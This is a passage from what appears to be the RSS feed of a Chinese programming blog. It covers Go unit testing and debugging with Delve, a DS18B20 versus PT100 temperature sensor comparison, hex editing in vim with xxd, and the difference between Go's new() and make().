&lt;p&gt;接下来是在&amp;rsquo;program_test.go&amp;rsquo;文件中添加测试代码。测试文件需要引入&amp;rsquo;testing&amp;rsquo;包。接下来是编写测试函数，测试函数需要&amp;rsquo;Test&amp;rsquo;字符开头，注意必须是大写&amp;rsquo;T&amp;rsquo;开头的&amp;rsquo;Test&amp;rsquo;。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import &amp;quot;testing&amp;quot;

func TestSomeFunction(t *testing.T) {
	// do some test here
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;table-driven-test&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#table-driven-test&#34;&gt;
        ##
    &lt;/a&gt;
    table driven test
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;go测试推荐&amp;rsquo;table drive test&amp;rsquo;的方法，其实是一种编程技巧，使用这种方法可以在一定程度上简化测试代码。&lt;/p&gt;
&lt;p&gt;这种测试方法其实是将测试的输入／输出作为测试数据写在一个结构体内，并在测试代码中使用，写个简单的例子，比如说要测试一个简单的&amp;rsquo;sum&amp;rsquo;函数。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func sum(a int, b int) int {
	return (a+b)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;测试代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// you&#39;re defining the test table here
var testCases = []struct {
    a      int
    b      int
    result int
}{
    {1, 2, 3},
    {3, 5, 8},
}

// test code
func TestSum(t *testing.T) {
    for _, tc := range testCases {
        r := sum(tc.a, tc.b)
        if r != tc.result {
            t.Errorf(&amp;quot;Failed case: param[%d, %d], result[%d], expected[%d]&amp;quot;, tc.a, tc.b, r, tc.result)
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;stdout重定向测试&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#stdout%e9%87%8d%e5%ae%9a%e5%90%91%e6%b5%8b%e8%af%95&#34;&gt;
        ##
    &lt;/a&gt;
    stdout重定向测试
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;关于stdout重定向测试并不是一个测试的重点，只是有时候你写的一个函数需要输出一些字符到标准输出stdout上，比如使用fmt.Println()，如果此时恰好需要测试程序检测这种情况，那么这种技巧就可以派上用场了。&lt;/p&gt;
&lt;p&gt;比如有下面这样一段程序：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func isNegative(i int) {
    if i &amp;lt; 0 {
        fmt.Println(&amp;quot;Negative&amp;quot;)
    } else {
        fmt.Println(&amp;quot;Non-negative&amp;quot;)
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个程序的测试可以这样写：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;func captureStdoutWithParam(f func(p int), p int) string {
	// save the original stdout
	oldStdout := os.Stdout
	// create pipe to redirect the stdout to &#39;r&#39;
	r, w, _ := os.Pipe()
	os.Stdout = w

	f(p)

	w.Close()
	// restore the stdout
	os.Stdout = oldStdout
	out, _ := ioutil.ReadAll(r)

	return string(out)
}

func TestIsNegative(t *testing.T) {
	cases := []struct {
		input  int
		output string
	}{
		{-3, &amp;quot;Negative&amp;quot;},
		{0, &amp;quot;Non-negative&amp;quot;},
		{5, &amp;quot;Non-negative&amp;quot;},
	}

	for _, c := range cases {
		out := captureStdoutWithParam(isNegative, c.input)
		if !strings.Contains(out, c.output) {
			t.Errorf(&amp;quot;Expected [%s], get[%s]&amp;quot;, c.output, out)
		}
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-debug&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#4-debug&#34;&gt;
        #
    &lt;/a&gt;
    4. debug
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;go语言debug有几个选项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;gdb&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/mailgun/godebug&#34;&gt;godebug&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/derekparker/delve&#34;&gt;Delve&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;gdb&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#gdb&#34;&gt;
        ##
    &lt;/a&gt;
    gdb
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;关于gdb的使用go的官方文档似乎并不推荐。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This applies to the standard toolchain (the gc Go compiler and tools). Gccgo has native gdb support. Besides this overview you might want to consult the GDB manual.&lt;/p&gt;
&lt;p&gt;GDB does not understand Go programs well. The stack management, threading, and runtime contain aspects that differ enough from the execution model GDB expects that they can confuse the debugger, even when the program is compiled with gccgo. As a consequence, although GDB can be useful in some situations, it is not a reliable debugger for Go programs, particularly heavily concurrent ones. Moreover, it is not a priority for the Go project to address these issues, which are difficult. In short, the instructions below should be taken only as a guide to how to use GDB when it works, not as a guarantee of success.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;godebug&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#godebug&#34;&gt;
        ##
    &lt;/a&gt;
    godebug
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;在godebug的github上也表明这个工具已经过时了，并且推荐使用&amp;rsquo;delve&amp;rsquo;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;DEPRECATED! There will be no further development. Please use &lt;a href=&#34;https://github.com/derekparker/delve&#34;&gt;https://github.com/derekparker/delve&lt;/a&gt;. But if you want to keep the project going and ready to become its maintaner please contact us and we can make you one.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;delve&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#delve&#34;&gt;
        ##
    &lt;/a&gt;
    delve
&lt;/div&gt;
&lt;/h3&gt;
&lt;h4 id=&#34;安装&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%89%e8%a3%85&#34;&gt;
        ###
    &lt;/a&gt;
    安装
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;参考github文档中的&lt;a href=&#34;https://github.com/derekparker/delve/blob/master/Documentation/installation/osx/install.md&#34;&gt;安装方法&lt;/a&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;方法一：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  $ brew install go-delve/delve/delve
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;方法二：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  $ xcode-select --install
  $ go get -u github.com/derekparker/delve/cmd/dlv
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来就可以使用dlv进行debug了。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ dlv --help
Delve is a source level debugger for Go programs.

Delve enables you to interact with your program by controlling the execution of the process,
evaluating variables, and providing information of thread / goroutine state, CPU register state and more.

The goal of this tool is to provide a simple yet powerful interface for debugging Go programs.

Pass flags to the program you are debugging using `--`, for example:

`dlv exec ./hello -- server --config conf/config.toml`

Usage:
  dlv [command]

Available Commands:
  attach      Attach to running process and begin debugging.
  connect     Connect to a headless debug server.
  core        Examine a core dump.
  debug       Compile and begin debugging main package in current directory, or the package specified.
  exec        Execute a precompiled binary, and begin a debug session.
  help        Help about any command
  run         Deprecated command. Use &#39;debug&#39; instead.
  test        Compile test binary and begin debugging program.
  trace       Compile and begin tracing program.
  version     Prints version.

Flags:
      --accept-multiclient   Allows a headless server to accept multiple client connections. Note that the server API is not reentrant and clients will have to coordinate.
      --api-version int      Selects API version when headless. (default 1)
      --backend string       Backend selection:
	default		Uses lldb on macOS, native everywhere else.
	native		Native backend.
	lldb		Uses lldb-server or debugserver.
	rr		Uses mozilla rr (https://github.com/mozilla/rr).
 (default &amp;quot;default&amp;quot;)
      --build-flags string   Build flags, to be passed to the compiler.
      --headless             Run debug server only, in headless mode.
      --init string          Init file, executed by the terminal client.
  -l, --listen string        Debugging server listen address. (default &amp;quot;localhost:0&amp;quot;)
      --log                  Enable debugging server logging.
      --wd string            Working directory for running the program. (default &amp;quot;.&amp;quot;)

Use &amp;quot;dlv [command] --help&amp;quot; for more information about a command.
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Temp Sensor Comparasion</title>
      <link>/2017/11/temp-sensor-comparasion/</link>
      <pubDate>Fri, 10 Nov 2017 11:56:13 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/temp-sensor-comparasion/</guid>
      <description>&lt;p&gt;DS18B20
PT100&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;DS18B20&lt;/th&gt;
&lt;th&gt;PT100&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;器件稳定性&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;温度测量范围&lt;/td&gt;
&lt;td&gt;-55～125℃&lt;/td&gt;
&lt;td&gt;-200～850℃&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;测温时延&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;精度偏差&lt;/td&gt;
&lt;td&gt;+-0.5℃&lt;/td&gt;
&lt;td&gt;B级别可达0.5%，精度较高，但需要校准&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;年漂移量&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;工作电压&lt;/td&gt;
&lt;td&gt;3-5.5V&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;体积&lt;/td&gt;
&lt;td&gt;稍大，探头直径6mm&lt;/td&gt;
&lt;td&gt;较小，探头直径5mm&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;引线长度&lt;/td&gt;
&lt;td&gt;最长30米&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;信号接口数量&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;成本&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;寿命&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;开发难度&lt;/td&gt;
&lt;td&gt;容易，直接数字信号输出&lt;/td&gt;
&lt;td&gt;相对复杂，需要校准&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;特点&lt;/td&gt;
&lt;td&gt;具有体积小、硬件开销低、抗干扰能力强、精度高的特点&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</description>
    </item>
    
    <item>
      <title>使用vim进行16进制编辑</title>
      <link>/2017/11/%E4%BD%BF%E7%94%A8vim%E8%BF%9B%E8%A1%8C16%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91/</link>
      <pubDate>Thu, 09 Nov 2017 10:27:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/%E4%BD%BF%E7%94%A8vim%E8%BF%9B%E8%A1%8C16%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;记录一下使用vim编辑二进制文件的方法，这个方法使用了vim执行 &amp;lsquo;%!&amp;rsquo; 来打开外部程序的小技巧。&lt;/p&gt;
&lt;p&gt;使用vim打开任意文件，并运行下面命令便进入16禁止编辑模式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:%!xxd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;退出时一定要记得使用下面命令，将编辑的hexdump内容还原成二进制：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:%!xxd -r
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用这个技巧需要注意的是打开二进制文件编辑模式必须使用&amp;rsquo;-b&amp;rsquo;参数，否则vim会在编辑内容末尾增加0x0a字符，保存的时候也就会增加一个字节的信息。&lt;/p&gt;
&lt;p&gt;使用&amp;rsquo;-b&amp;rsquo;参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000: 0011 2233                                ..&amp;quot;3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不使用&amp;rsquo;-b&amp;rsquo;参数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;00000000: 0011 2233 0a                             ..&amp;quot;3.
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Go语言中new与make的比较</title>
      <link>/2017/11/go%E8%AF%AD%E8%A8%80%E4%B8%ADnew%E4%B8%8Emake%E7%9A%84%E6%AF%94%E8%BE%83/</link>
      <pubDate>Wed, 08 Nov 2017 10:58:00 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/go%E8%AF%AD%E8%A8%80%E4%B8%ADnew%E4%B8%8Emake%E7%9A%84%E6%AF%94%E8%BE%83/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;go语言new()与make()的区别对于初入golang的开发者来说是个容易混淆的点，这里尝试对这两个的区别做一些总结。&lt;/p&gt;
&lt;h3 id=&#34;官方文档&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%ae%98%e6%96%b9%e6%96%87%e6%a1%a3&#34;&gt;
        ##
    &lt;/a&gt;
    官方文档
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;首先查找官方文档中的描述，首先是关于&amp;rsquo;new()&amp;lsquo;的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// The new built-in function allocates memory. The first argument is a type,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// not a value, and the value returned is a pointer to a newly
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// allocated zero value of that type.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;new&lt;/span&gt;(Type) &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;Type&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;关于&amp;rsquo;make()&amp;rsquo;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// The make built-in function allocates and initializes an object of type
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// slice, map, or chan (only). Like new, the first argument is a type, not a
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// value. Unlike new, make&amp;#39;s return type is the same as the type of its
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// argument, not a pointer to it. The specification of the result depends on
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;// the type:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	Slice: The size specifies the length. The capacity of the slice is
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	equal to its length. A second integer argument may be provided to
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	specify a different capacity; it must be no smaller than the
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	length, so make([]int, 0, 10) allocates a slice of length 0 and
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	capacity 10.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	Map: An empty map is allocated with enough space to hold the
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	specified number of elements. The size may be omitted, in which case
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	a small starting size is allocated.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	Channel: The channel&amp;#39;s buffer is initialized with the specified
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	buffer capacity. If zero, or the size is omitted, the channel is
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;//	unbuffered.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;make&lt;/span&gt;(t Type, size &lt;span style=&#34;color:#666&#34;&gt;...&lt;/span&gt;IntegerType) Type&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;h3 id=&#34;new-vs-make&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#new-vs-make&#34;&gt;
        ##
    &lt;/a&gt;
    new() vs make()
&lt;/div&gt;
&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;new()&lt;/th&gt;
&lt;th&gt;make()&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;定义&lt;/td&gt;
&lt;td&gt;为需要创建的数据类型分配内存，返回一个指向分配内存的指针&lt;/td&gt;
&lt;td&gt;为需要创建的&lt;strong&gt;slice/map/chan类型&lt;/strong&gt;分配资源并&lt;strong&gt;初始化&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;输入&lt;/td&gt;
&lt;td&gt;一个参数，指定需要创建的数据类型&lt;/td&gt;
&lt;td&gt;多个参数，不同类型又专有意义&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;输出&lt;/td&gt;
&lt;td&gt;指针&lt;/td&gt;
&lt;td&gt;数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;使用场景&lt;/td&gt;
&lt;td&gt;任意类型&lt;/td&gt;
&lt;td&gt;只能用于slice/map/chan类型数据&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;new的使用说明&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#new%e7%9a%84%e4%bd%bf%e7%94%a8%e8%af%b4%e6%98%8e&#34;&gt;
        ##
    &lt;/a&gt;
    new()的使用说明
&lt;/div&gt;
&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;var&lt;/span&gt; s3 = &lt;span style=&#34;color:#007020&#34;&gt;new&lt;/span&gt;([]&lt;span style=&#34;color:#902000&#34;&gt;int&lt;/span&gt;)
